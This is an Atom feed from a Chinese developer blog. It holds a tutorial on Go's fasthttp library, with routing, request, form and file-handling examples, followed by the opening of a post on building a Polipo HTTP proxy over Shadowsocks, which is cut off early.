<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>紫川秀的博客</title>
  <subtitle>比你优秀的人不可怕,可怕的是比你优秀的人比你更努力。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.yumaojun.net/"/>
  <updated>2017-01-25T15:25:22.000Z</updated>
  <id>https://blog.yumaojun.net/</id>
  
  <author>
    <name>紫川秀</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>高性能web之fasthttp</title>
    <link href="https://blog.yumaojun.net/2017/01/25/fasthttp/"/>
    <id>https://blog.yumaojun.net/2017/01/25/fasthttp/</id>
    <published>2017-01-25T05:18:39.000Z</published>
    <updated>2017-01-25T15:25:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>浏览网上博客时发现了这么一篇测试文章<a href="http://www.qingpingshan.com/jb/go/148453.html" target="_blank" rel="external">nginx vs iris</a>, 结果是<code>iris</code>越胜一筹, 而<code>Iris</code>底层使用的并不是Golang的HTTP的标准库, 而是使用的第三方库<code>fasthttp</code>, 之前读过一点关于golang的<code>net/http</code>, 在处理用户的请求时的确有点粗暴, 直接一个连接一个<code>goroutine</code>, 完全没有并发的控制。按捺不做内心的好奇, 想感受一把<code>fasthttp</code>, 来一起走进fasthttp的世界看看。<br><a id="more"></a></p>
<h2 id="Benchmark的的胜出"><a href="#Benchmark的的胜出" class="headerlink" title="Benchmark的的胜出"></a>Benchmark的的胜出</h2><p>github上面有一个好事者写了一个Go Web框架性能的压测工具, 结果是<code>fasthttp</code>表现非常优异, 具体请查看<a href="https://github.com/smallnest/go-web-framework-benchmark" target="_blank" rel="external">go-web-framework-benchmark github地址</a><br>请允许我贴一张他的图<br><img src="http://oiw1gzfww.bkt.clouddn.com/benchmark__latency.png" alt=""></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>fasthttp</code>是<code>Go</code>的HTTP的第三方实现, 它宣称比标准库<code>net/http</code>快10倍, 是一款高性能的HTTP实现。Github中的<code>Fasthttp best practices</code>这段描述了它为啥高性能的原因</p>
<ul>
<li>net/http 的实现是一个连接新建一个 goroutine; <code>fasthttp</code>是利用一个 worker 复用 goroutine，减轻 runtime 调度 goroutine 的压力</li>
<li>net/http 解析的请求数据很多放在 map[string]string (http.Header) 或 map[string][]string (http.Request.Form)，有不必要的 []byte 到 string 的转换，是可以规避的</li>
<li>net/http 解析 HTTP 请求每次生成新的 <em>http.Request 和 http.ResponseWriter; <code>fasthttp</code>解析 HTTP 数据到 </em>fasthttp.RequestCtx ，然后使用 sync.Pool复用结构实例，减少对象的数量</li>
<li><code>fasthttp</code>会延迟解析 HTTP 请求中的数据，尤其是 Body 部分。这样节省了很多不直接操作 Body 的情况的消耗</li>
</ul>
<p>但是因为<code>fasthttp</code>的实现与标准库差距较大，所以<code>API</code>的设计完全不同, 因此也不兼容标准库<code>net/http</code>。使用时既需要理解<code>HTTP</code>的处理过程，又需要注意和标准库的差别。</p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p>基本用法很简单, 1. 写好handler 2. 监听交给handler处理.<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// 使用RequestCtx传递HTTP的数据</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">httpHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprint(ctx, <span class="string">"hello fasthttp"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 启动服务时指定处理任务的handler</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">if</span> err := fasthttp.ListenAndServe(<span class="string">"0.0.0.0:8080"</span>, httpHandler); err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"start fasthttp fail:"</span>, err.Error())</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><code>net/http</code>提供<code>http.ServeMux</code>实现路由服务，但是匹配规则简陋，功能很简单，基本不会使用。 <code>fasthttp</code>吸取教训，默认没有提供路由支持。官方提到了4个路由实现: <code>Iris</code>, <code>fasthttp-routing</code>, <code>fasthttproute</code>, <code>lu</code>, 第一个是框架, 第二三个是单纯的路由, 第4个不知道。我这里选择<code>fasthttprouter</code>, 因为github上面这个项目文档和活跃度比较不错</p>
<h3 id="安装fasthttprouter"><a href="#安装fasthttprouter" class="headerlink" title="安装fasthttprouter"></a>安装fasthttprouter</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">➜  Blogs go get -u -v &quot;github.com/buaazp/fasthttprouter&quot;</div><div class="line">github.com/buaazp/fasthttprouter (download)</div><div class="line">github.com/valyala/fasthttp (download)</div><div class="line">github.com/klauspost/compress (download)</div><div class="line">github.com/klauspost/cpuid (download)</div><div class="line">github.com/klauspost/crc32 (download)</div><div class="line">github.com/valyala/bytebufferpool (download)</div><div class="line">github.com/buaazp/fasthttprouter</div></pre></td></tr></table></figure>
<h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>详尽的使用还得去看Github或者源码, 请允许我贴一段官方的代码, 我本地也用着这个测<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprint(ctx, <span class="string">"Welcome!\n"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.GET(<span class="string">"/"</span>, Index)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="请求和响应"><a href="#请求和响应" class="headerlink" title="请求和响应"></a>请求和响应</h2><p>在fasthttp中使用一个对象来维护请求的上下文:<code>RequestCtx</code>, 它综合了<code>http.Request</code>和<code>http.ResponseWriter</code>的操作，可以更方便的读取和返回数据, 通过下图这种对照表我们可以清晰的看出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">r.Body -&gt; ctx.PostBody()</div><div class="line">r.URL.Path -&gt; ctx.Path()</div><div class="line">r.URL -&gt; ctx.URI()</div><div class="line">r.Method -&gt; ctx.Method()</div><div class="line">r.Header -&gt; ctx.Request.Header</div><div class="line">r.Header.Get() -&gt; ctx.Request.Header.Peek()</div><div class="line">r.Host -&gt; ctx.Host()</div><div class="line">r.Form -&gt; ctx.QueryArgs() + ctx.PostArgs()</div><div class="line">r.PostForm -&gt; ctx.PostArgs()</div><div class="line">r.FormValue() -&gt; ctx.FormValue()</div><div class="line">r.FormFile() -&gt; ctx.FormFile()</div><div class="line">r.MultipartForm -&gt; ctx.MultipartForm()</div><div class="line">r.RemoteAddr -&gt; ctx.RemoteAddr()</div><div class="line">r.RequestURI -&gt; ctx.RequestURI()</div><div class="line">r.TLS -&gt; ctx.IsTLS()</div><div class="line">r.Cookie() -&gt; ctx.Request.Header.Cookie()</div><div class="line">r.Referer() -&gt; ctx.Referer()</div><div class="line">r.UserAgent() -&gt; ctx.UserAgent()</div><div class="line">w.Header() -&gt; ctx.Response.Header</div><div class="line">w.Header().Set() -&gt; ctx.Response.Header.Set()</div><div class="line">w.Header().Set(&quot;Content-Type&quot;) -&gt; ctx.SetContentType()</div><div class="line">w.Header().Set(&quot;Set-Cookie&quot;) -&gt; ctx.Response.Header.SetCookie()</div><div class="line">w.Write() -&gt; ctx.Write(), ctx.SetBody(), ctx.SetBodyStream(), ctx.SetBodyStreamWriter()</div><div class="line">w.WriteHeader() -&gt; ctx.SetStatusCode()</div><div class="line">w.(http.Hijacker).Hijack() -&gt; ctx.Hijack()</div><div class="line">http.Error() -&gt; ctx.Error()</div><div class="line">http.FileServer() -&gt; fasthttp.FSHandler(), fasthttp.FS</div><div class="line">http.ServeFile() -&gt; fasthttp.ServeFile()</div><div class="line">http.Redirect() -&gt; ctx.Redirect()</div><div class="line">http.NotFound() -&gt; ctx.NotFound()</div><div class="line">http.StripPrefix() -&gt; fasthttp.PathRewriteFunc</div></pre></td></tr></table></figure></p>
<p>下面是一个简单例子，在上下文中获取请求数据, 通过WriteString来返回响应。<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">httpHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	ctx.WriteString(<span class="string">"hello,fasthttp"</span>)</div><div class="line">	<span class="comment">// 因为实现不同，fasthttp 的返回内容不是即刻返回的</span></div><div class="line">	<span class="comment">// 不同于标准库，添加返回内容后设置状态码，也是有效的</span></div><div class="line">	ctx.SetStatusCode(<span class="number">404</span>)</div><div class="line"></div><div class="line">	<span class="comment">// 返回的内容也是可以获取的，不需要标准库的用法，需要自己扩展 http.ResponseWriter</span></div><div class="line">	fmt.Printf(<span class="string">"Host: %s\n"</span>, ctx.Host())</div><div class="line">	fmt.Printf(<span class="string">"Body: %s\n"</span>, ctx.Response.Body())</div><div class="line">	fmt.Printf(<span class="string">"Path: %s\n"</span>, ctx.Path())</div><div class="line">	fmt.Printf(<span class="string">"Method: %s\n"</span>, ctx.Method())</div><div class="line">	fmt.Printf(<span class="string">"URI: %s\n"</span>, ctx.URI())</div><div class="line">	fmt.Printf(<span class="string">"Connect Time: %s\n"</span>, ctx.ConnTime())</div><div class="line">	fmt.Printf(<span class="string">"UserAgent: %s\n"</span>, ctx.UserAgent())</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.GET(<span class="string">"/"</span>, httpHandler)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Body处理"><a href="#Body处理" class="headerlink" title="Body处理"></a>Body处理</h2><p>fasthttp 提供比标准库丰富的 Body 操作 API，而且支持解析 Gzip 过的数据, 我们可以简单的使用上下文的PostBody方法获取body<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"encoding/json"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">httpHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	body := ctx.PostBody() <span class="comment">// 获取到的是 []byte</span></div><div class="line">	fmt.Fprintf(ctx, <span class="string">"Body:%s"</span>, body)</div><div class="line"></div><div class="line">	<span class="comment">// 因为是 []byte，解析 JSON 很简单</span></div><div class="line">	<span class="keyword">var</span> v <span class="keyword">interface</span>&#123;&#125;</div><div class="line">	json.Unmarshal(body, &amp;v)</div><div class="line">	fmt.Printf(<span class="string">"%v"</span>, v)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.POST(<span class="string">"/"</span>, httpHandler)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>简单的测试结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">➜  Blogs curl -X POST -d &apos;&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;&apos; http://127.0.0.1:8080/</div><div class="line">Body:&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;</div></pre></td></tr></table></figure></p>
<h2 id="表单处理"><a href="#表单处理" class="headerlink" title="表单处理"></a>表单处理</h2><p>RequestCtx有同标准库的 FormValue() 方法，还对 GET 和 POST/PUT 传递的参数进行了区分<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"bytes"</span></div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">httpHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	ctx.SetContentType(<span class="string">"text/html"</span>)</div><div class="line"></div><div class="line">	<span class="comment">// GET ?abc=abc&amp;abc=123</span></div><div class="line">	getValues := ctx.QueryArgs()</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"GET abc=%s &lt;br/&gt;"</span>,</div><div class="line">		getValues.Peek(<span class="string">"abc"</span>)) <span class="comment">// Peek 只获取第一个值</span></div><div class="line">	fmt.Fprintf(ctx, <span class="string">"GET abc=%s &lt;br/&gt;"</span>,</div><div class="line">		bytes.Join(getValues.PeekMulti(<span class="string">"abc"</span>), []<span class="keyword">byte</span>(<span class="string">","</span>))) <span class="comment">// PeekMulti 获取所有值</span></div><div class="line"></div><div class="line">	<span class="comment">// POST xyz=xyz&amp;xyz=123</span></div><div class="line">	postValues := ctx.PostArgs()</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"POST xyz=%s &lt;br/&gt;"</span>,</div><div class="line">		postValues.Peek(<span class="string">"xyz"</span>))</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"POST xyz=%s &lt;br/&gt;"</span>,</div><div class="line">		bytes.Join(postValues.PeekMulti(<span class="string">"xyz"</span>), []<span class="keyword">byte</span>(<span class="string">","</span>)))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.POST(<span class="string">"/"</span>, httpHandler)</div><div class="line">	router.GET(<span class="string">"/"</span>, httpHandler)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>输出结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GET abc=abc </div><div class="line">GET abc=abc,123 </div><div class="line">POST xyz=xyz </div><div class="line">POST xyz=xyz,123</div></pre></td></tr></table></figure></p>
<h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><p>fasthttp提供十分友好的接口, 通过FromFile读文件上传, 通过SendFile来提供下载<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"io"</span></div><div class="line">	<span class="string">"log"</span></div><div class="line">	<span class="string">"os"</span></div><div class="line"></div><div class="line">	<span class="string">"github.com/buaazp/fasthttprouter"</span></div><div class="line">	<span class="string">"github.com/valyala/fasthttp"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">Hello</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	fmt.Fprintf(ctx, <span class="string">"hello, %s!\n"</span>, ctx.UserValue(<span class="string">"name"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">UploadHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	<span class="comment">// 这里直接获取到 multipart.FileHeader, 需要手动打开文件句柄</span></div><div class="line">	f, err := ctx.FormFile(<span class="string">"upload.txt"</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		ctx.SetStatusCode(<span class="number">500</span>)</div><div class="line">		fmt.Println(<span class="string">"get upload file error:"</span>, err)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	fh, err := f.Open()</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"open upload file error:"</span>, err)</div><div class="line">		ctx.SetStatusCode(<span class="number">500</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">defer</span> fh.Close() <span class="comment">// 记得要关</span></div><div class="line"></div><div class="line">	<span class="comment">// 打开保存文件句柄</span></div><div class="line">	fp, err := os.OpenFile(<span class="string">"saveto.txt"</span>, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, <span class="number">0666</span>)</div><div class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"open saving file error:"</span>, err)</div><div class="line">		ctx.SetStatusCode(<span class="number">500</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">defer</span> fp.Close() <span class="comment">// 记得要关</span></div><div class="line"></div><div class="line">	<span class="keyword">if</span> _, err = io.Copy(fp, fh); err != <span class="literal">nil</span> &#123;</div><div class="line">		fmt.Println(<span class="string">"save upload file error:"</span>, err)</div><div class="line">		ctx.SetStatusCode(<span class="number">500</span>)</div><div class="line">		<span class="keyword">return</span></div><div class="line">	&#125;</div><div class="line">	ctx.Write([]<span class="keyword">byte</span>(<span class="string">"save file successfully!"</span>))</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">DownloadHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</div><div class="line">	ctx.SendFile(<span class="string">"downlaod.txt"</span>)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	router := fasthttprouter.New()</div><div class="line">	router.POST(<span class="string">"/"</span>, UploadHandler)</div><div class="line">	router.GET(<span class="string">"/"</span>, DownloadHandler)</div><div class="line">	router.GET(<span class="string">"/hello/:name"</span>, Hello)</div><div class="line"></div><div class="line">	log.Fatal(fasthttp.ListenAndServe(<span class="string">":8080"</span>, router.Handler))</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;浏览网上博客时发现了这么一篇测试文章&lt;a href=&quot;http://www.qingpingshan.com/jb/go/148453.html&quot;&gt;nginx vs iris&lt;/a&gt;, 结果是&lt;code&gt;iris&lt;/code&gt;越胜一筹, 而&lt;code&gt;Iris&lt;/code&gt;底层使用的并不是Golang的HTTP的标准库, 而是使用的第三方库&lt;code&gt;fasthttp&lt;/code&gt;, 之前读过一点关于golang的&lt;code&gt;net/http&lt;/code&gt;, 在处理用户的请求时的确有点粗暴, 直接一个连接一个&lt;code&gt;goroutine&lt;/code&gt;, 完全没有并发的控制。按捺不做内心的好奇, 想感受一把&lt;code&gt;fasthttp&lt;/code&gt;, 来一起走进fasthttp的世界看看。&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="fasthttp" scheme="https://blog.yumaojun.net/tags/fasthttp/"/>
    
  </entry>
  
  <entry>
    <title>利用Polipo构建基于SS的http proxy</title>
    <link href="https://blog.yumaojun.net/2017/01/24/http-proxy/"/>
    <id>https://blog.yumaojun.net/2017/01/24/http-proxy/</id>
    <published>2017-01-24T01:04:33.000Z</published>
    <updated>2017-01-24T02:10:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>搞这个的主要原因是golang的很多依赖包需要翻墙下载, 这不像Python和NodeJS有官方源仓库的语言(配置国内源可以加速). 之前用windows的时候也是使用ss, 而<code>http proxy</code>是通过chrome的一个插件<code>Proxy SwitchyOmega</code>来做的，但是在mac下面这招不灵了, 下面主要介绍mac如何利用ss搭建<code>http proxy</code>.<br><a id="more"></a></p>
<h2 id="安装Shadowsocks"><a href="#安装Shadowsocks" class="headerlink" title="安装Shadowsocks"></a>安装Shadowsocks</h2><p>ss的安装和运行是前提, 这里不多做介绍，具体请查看<a href="http://www.ishadowsocks.mobi/" target="_blank" rel="external">Shadowsocks安装和使用</a></p>
<h2 id="Polipo简介"><a href="#Polipo简介" class="headerlink" title="Polipo简介"></a>Polipo简介</h2><p>这里主要使用<code>Polipo</code>来做<code>http proxy</code>, <code>polipo</code>的官方是这样介绍它的：<em>“Polipo 是一个小而快速的缓存 web 代理程序(web 缓存, HTTP 代理, 代理服务器)。尽管 Polipo 是为一个人或一小群人使用而设计的，但并不妨碍它为一大群人所使用。”</em>,<br>该项目的地址 <a href="https://github.com/jech/polipo" target="_blank" rel="external">polipo Github地址</a>, 该项目的官方文档<a href="https://www.irzhenif.fr/~jch/software/polipo/" target="_blank" rel="external">polipo官方文档</a><br>可惜该项目的作者已经停止该项目的维护了, 且用且珍惜。</p>
<h2 id="Polipo安装"><a href="#Polipo安装" class="headerlink" title="Polipo安装"></a>Polipo安装</h2><p>Shadowsocks官方推荐<code>http proxy</code>代理也是<code>Polipo</code>, 官方对此也做了简单的描述，我直接抄过来了</p>
<ul>
